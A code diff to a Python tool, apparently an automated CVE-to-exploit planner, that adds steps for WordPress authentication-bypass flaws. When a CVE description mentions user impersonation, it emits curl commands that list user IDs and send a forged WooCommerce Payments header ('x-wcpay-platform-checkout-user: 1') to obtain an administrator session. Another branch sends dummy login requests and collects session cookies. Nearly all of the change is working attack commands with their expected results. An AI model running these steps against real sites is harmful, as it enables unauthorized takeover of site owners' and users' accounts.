@@ -1390,28 +1390,58 @@ class CveIntelligence:
             )
 
         vc = profile.vuln_class
+        desc_lower = (profile.raw_description or "").lower()
 
         if vc == "auth_bypass":
-            step(
-                f"POST {ep} with minimal/dummy params (login_type, identifier, etc.)",
-                curl=(f"curl -si -X POST '{full_ep}' "
-                      f"-H 'Content-Type: application/json' "
-                      f"-d '{{\"login_type\":\"google\",\"password\":\"dummy\"}}' | head -20"),
-                expected="HTTP 200/403 body + Set-Cookie in response headers",
-            )
-            step(
-                "Inspect EVERY response (even 4xx) for Set-Cookie with auth tokens",
-                curl=(f"curl -si -X POST '{full_ep}' "
-                      f"-d '{{\"login_type\":\"google\",\"password\":\"dummy\"}}' "
-                      f"| grep -i set-cookie"),
-                expected="wordpress_logged_in_* or similar cookie",
-            )
-            step(
-                "If auth cookie received: GET /wp-admin/profile.php to confirm session",
-                curl=(f"curl -si '{base}/wp-admin/profile.php' "
-                      f"-H 'Cookie: <captured_cookie>' | grep -i 'profile\\|admin'"),
-                expected="Profile page loads (200), not a redirect to /wp-login.php",
-            )
+            # Detect user-ID-impersonation pattern (WooCommerce Payments / similar):
+            # "log in as any user", "knows the user id", "platform-checkout" in description
+            _user_id_bypass = any(kw in desc_lower for kw in (
+                "log in as any", "log in as an", "as any existing", "as any user",
+                "knows the user id", "user_id", "platform-checkout", "impersonat",
+                "gain access as an admin", "gain access as administrator",
+                "as an administrator", "as any authenticated",
+            ))
+            if _user_id_bypass:
+                step(
+                    "Enumerate user IDs (admin is usually ID=1)",
+                    curl=(f"curl -si '{base}/wp-json/wp/v2/users' | jq '.[].id'"),
+                    expected="JSON array of user IDs; ID 1 is typically the administrator",
+                )
+                step(
+                    "Send user ID via header to bypass authentication (WC Payments pattern)",
+                    curl=(f"curl -si -X POST '{base}/wp-json/wc/store/v1/checkout' "
+                          f"-H 'x-wcpay-platform-checkout-user: 1' "
+                          f"-H 'x-wcpay-platform-checkout-nonce: <get_from_wc_checkout_js>' "
+                          f"| grep -i 'Set-Cookie\\|is_admin\\|token'"),
+                    expected="Set-Cookie with admin session, or response body confirming user 1 identity",
+                )
+                step(
+                    "Confirm admin session on /wp-admin/profile.php",
+                    curl=(f"curl -si '{base}/wp-admin/profile.php' "
+                          f"-H 'Cookie: <captured_cookie>' | grep -i 'profile\\|admin'"),
+                    expected="Profile page 200 (not redirect to /wp-login.php)",
+                )
+            else:
+                step(
+                    f"POST {ep} with minimal/dummy params (login_type, identifier, etc.)",
+                    curl=(f"curl -si -X POST '{full_ep}' "
+                          f"-H 'Content-Type: application/json' "
+                          f"-d '{{\"login_type\":\"google\",\"password\":\"dummy\"}}' | head -20"),
+                    expected="HTTP 200/403 body + Set-Cookie in response headers",
+                )
+                step(
+                    "Inspect EVERY response (even 4xx) for Set-Cookie with auth tokens",
+                    curl=(f"curl -si -X POST '{full_ep}' "
+                          f"-d '{{\"login_type\":\"google\",\"password\":\"dummy\"}}' "
+                          f"| grep -i set-cookie"),
+                    expected="wordpress_logged_in_* or similar cookie",
+                )
+                step(
+                    "If auth cookie received: GET /wp-admin/profile.php to confirm session",
+                    curl=(f"curl -si '{base}/wp-admin/profile.php' "
+                          f"-H 'Cookie: <captured_cookie>' | grep -i 'profile\\|admin'"),
+                    expected="Profile page loads (200), not a redirect to /wp-login.php",
+                )
             step(
                 "Document: request → response body + cookies → /wp-admin/profile.php access",
                 expected="Screenshot or response diff showing authenticated access",
